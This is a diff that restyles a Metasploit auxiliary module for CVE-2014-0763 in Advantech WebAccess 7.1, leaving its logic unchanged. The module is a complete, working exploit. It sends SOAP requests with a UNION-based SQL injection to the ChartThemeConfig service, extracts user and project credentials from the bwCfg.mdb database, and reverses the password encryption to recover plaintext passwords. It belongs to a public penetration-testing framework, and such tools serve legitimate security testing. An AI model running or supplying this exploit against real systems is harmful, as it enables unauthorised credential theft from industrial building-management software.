@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,58 +8,55 @@ require 'msf/core'
 require 'rexml/document'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include REXML
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Advantech WebAccess SQL Injection',
-      'Description'    => %q{
-        This module exploits a SQL injection vulnerability found in Advantech WebAccess 7.1. The
-        vulnerability exists in the DBVisitor.dll component, and can be abused through malicious
-        requests to the ChartThemeConfig web service. This module can be used to extract the site
-        and project usernames and hashes.
-      },
-      'References'     =>
-        [
-          [ 'CVE', '2014-0763' ],
-          [ 'ZDI', '14-077' ],
-          [ 'OSVDB', '105572' ],
-          [ 'BID', '66740' ],
-          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-14-079-03' ]
-        ],
-      'Author'         =>
-        [
-          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
-          'juan vazquez' # Metasploit module
-        ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => "Apr 08 2014"
-    ))
+                      'Name'           => 'Advantech WebAccess SQL Injection',
+                      'Description'    => %q(
+                        This module exploits a SQL injection vulnerability found in Advantech WebAccess 7.1. The
+                        vulnerability exists in the DBVisitor.dll component, and can be abused through malicious
+                        requests to the ChartThemeConfig web service. This module can be used to extract the site
+                        and project usernames and hashes.
+                      ),
+                      'References'     =>
+                        [
+                          [ 'CVE', '2014-0763' ],
+                          [ 'ZDI', '14-077' ],
+                          [ 'OSVDB', '105572' ],
+                          [ 'BID', '66740' ],
+                          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-14-079-03' ]
+                        ],
+                      'Author'         =>
+                        [
+                          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
+                          'juan vazquez' # Metasploit module
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'DisclosureDate' => "Apr 08 2014"))
 
     register_options(
       [
         OptString.new("TARGETURI", [true, 'The path to the BEMS Web Site', '/BEMS']),
         OptString.new("WEB_DATABASE", [true, 'The path to the bwCfg.mdb database in the target', "C:\\WebAccess\\Node\\config\\bwCfg.mdb"])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def build_soap(injection)
     xml = Document.new
     xml.add_element(
-        "s:Envelope",
-        {
-            'xmlns:s' => "http://schemas.xmlsoap.org/soap/envelope/"
-        })
+      "s:Envelope",
+      'xmlns:s' => "http://schemas.xmlsoap.org/soap/envelope/"
+    )
     xml.root.add_element("s:Body")
     body = xml.root.elements[1]
     body.add_element(
-        "GetThemeNameList",
-        {
-            'xmlns' => "http://tempuri.org/"
-        })
+      "GetThemeNameList",
+      'xmlns' => "http://tempuri.org/"
+    )
     name_list = body.elements[1]
     name_list.add_element("userName")
     name_list.elements['userName'].text = injection
@@ -69,15 +67,13 @@ class MetasploitModule < Msf::Auxiliary
   def do_sqli(injection, mark)
     xml = build_soap(injection)
 
-    res = send_request_cgi({
-      'method'    => 'POST',
-      'uri'       => normalize_uri(target_uri.path.to_s, "Services", "ChartThemeConfig.svc"),
-      'ctype'    => 'text/xml; charset=UTF-8',
-      'headers'  => {
-          'SOAPAction' => '"http://tempuri.org/IChartThemeConfig/GetThemeNameList"'
-      },
-      'data'      => xml
-    })
+    res = send_request_cgi('method' => 'POST',
+                           'uri' => normalize_uri(target_uri.path.to_s, "Services", "ChartThemeConfig.svc"),
+                           'ctype'    => 'text/xml; charset=UTF-8',
+                           'headers'  => {
+                             'SOAPAction' => '"http://tempuri.org/IChartThemeConfig/GetThemeNameList"'
+                           },
+                           'data' => xml)
 
     unless res && res.code == 200 && res.body && res.body.include?(mark)
       return nil
@@ -92,9 +88,7 @@ class MetasploitModule < Msf::Auxiliary
     injection << "union all select '#{mark}' from BAThemeSetting where '#{Rex::Text.rand_text_alpha(2)}'='#{Rex::Text.rand_text_alpha(3)}"
     data = do_sqli(injection, mark)
 
-    if data.nil?
-      return Msf::Exploit::CheckCode::Safe
-    end
+    return Msf::Exploit::CheckCode::Safe if data.nil?
 
     Msf::Exploit::CheckCode::Vulnerable
   end
@@ -105,17 +99,14 @@ class MetasploitModule < Msf::Auxiliary
     strings = XPath.match(doc, "s:Envelope/s:Body/GetThemeNameListResponse/GetThemeNameListResult/a:string").map(&:text)
     strings_length = strings.length
 
-    unless strings_length > 1
-      return
-    end
+    return unless strings_length > 1
 
     i = 0
     strings.each do |result|
       next if result == mark
       @users << result.split(separator)
-      i = i + 1
+      i += 1
     end
-
   end
 
   def run
@@ -152,18 +143,18 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     users_table = Rex::Text::Table.new(
-      'Header'  => 'Advantech WebAccess Users',
-      'Indent'   => 1,
+      'Header' => 'Advantech WebAccess Users',
+      'Indent' => 1,
       'Columns' => ['Username', 'Encrypted Password', 'Key', 'Recovered password', 'Origin']
     )
 
     for i in 0..@users.length - 1
       @plain_passwords[i] =
-          begin
-            decrypt_password(@users[i][1], @users[i][2])
-          rescue
-            "(format not recognized)"
-          end
+        begin
+          decrypt_password(@users[i][1], @users[i][2])
+        rescue
+          "(format not recognized)"
+        end
 
       @plain_passwords[i] = "(blank password)" if @plain_passwords[i].empty?
 
@@ -171,7 +162,7 @@ class MetasploitModule < Msf::Auxiliary
         @plain_passwords[i].encode("ISO-8859-1").to_s
       rescue Encoding::UndefinedConversionError
         chars = @plain_passwords[i].unpack("C*")
-        @plain_passwords[i] = "0x#{chars.collect {|c| c.to_s(16)}.join(", 0x")}"
+        @plain_passwords[i] = "0x#{chars.collect { |c| c.to_s(16) }.join(', 0x')}"
         @plain_passwords[i] << " (ISO-8859-1 hex chars)"
       end
 
@@ -219,9 +210,7 @@ class MetasploitModule < Msf::Auxiliary
   def user_type(database)
     user_type = database
 
-    unless database == "BAUser"
-      user_type << " (Web Access)"
-    end
+    user_type << " (Web Access)" unless database == "BAUser"
 
     user_type
   end
@@ -233,15 +222,15 @@ class MetasploitModule < Msf::Auxiliary
     recovered_bytes = decrypt_bytes(recovered_password, recovered_key)
     password = []
 
-    recovered_bytes.each { |b|
+    recovered_bytes.each do |b|
       if b == 0
         break
       else
         password.push(b)
       end
-    }
+    end
 
-    return password.pack("C*")
+    password.pack("C*")
   end
 
   def recover_password(password)
@@ -252,24 +241,24 @@ class MetasploitModule < Msf::Auxiliary
     j = 0
     while i < 16
       low = bytes[i]
-      if low < 0x41
-        low = low - 0x30
-      else
-        low = low - 0x37
-      end
-      low = low * 16
+      low = if low < 0x41
+              low - 0x30
+            else
+              low - 0x37
+            end
+      low *= 16
 
-      high = bytes[i+1]
-      if high < 0x41
-        high = high - 0x30
-      else
-        high = high - 0x37
-      end
+      high = bytes[i + 1]
+      high = if high < 0x41
+               high - 0x30
+             else
+               high - 0x37
+             end
 
       recovered_byte = low + high
       recovered[j] = recovered_byte
-      i = i + 2
-      j = j + 1
+      i += 2
+      j += 1
     end
 
     recovered
@@ -279,15 +268,15 @@ class MetasploitModule < Msf::Auxiliary
     bytes = key.unpack("C*")
     recovered = 0
 
-    bytes[0, 8].each { |b|
-      recovered = recovered * 16
-      if b < 0x41
-        byte_weight = b - 0x30
-      else
-        byte_weight = b - 0x37
-      end
-      recovered = recovered + byte_weight
-    }
+    bytes[0, 8].each do |b|
+      recovered *= 16
+      byte_weight = if b < 0x41
+                      b - 0x30
+                    else
+                      b - 0x37
+                    end
+      recovered += byte_weight
+    end
 
     recovered
   end
@@ -297,10 +286,10 @@ class MetasploitModule < Msf::Auxiliary
     xor_table = [0xaa, 0xa5, 0x5a, 0x55]
     key_copy = key
     for i in 0..7
-      byte = (crazy(bytes[i] ,8 - (key & 7)) & 0xff)
+      byte = (crazy(bytes[i], 8 - (key & 7)) & 0xff)
       result.push(byte ^ xor_table[key_copy & 3])
-      key_copy = key_copy / 4
-      key = key / 8
+      key_copy /= 4
+      key /= 8
     end
 
     result
@@ -310,15 +299,11 @@ class MetasploitModule < Msf::Auxiliary
     result = byte & 0xff
 
     while magic > 0
-      result = result * 2
-        if result & 0x100 == 0x100
-          result = result + 1
-        end
-        magic = magic - 1
+      result *= 2
+      result += 1 if result & 0x100 == 0x100
+      magic -= 1
     end
 
     result
   end
-
 end
-
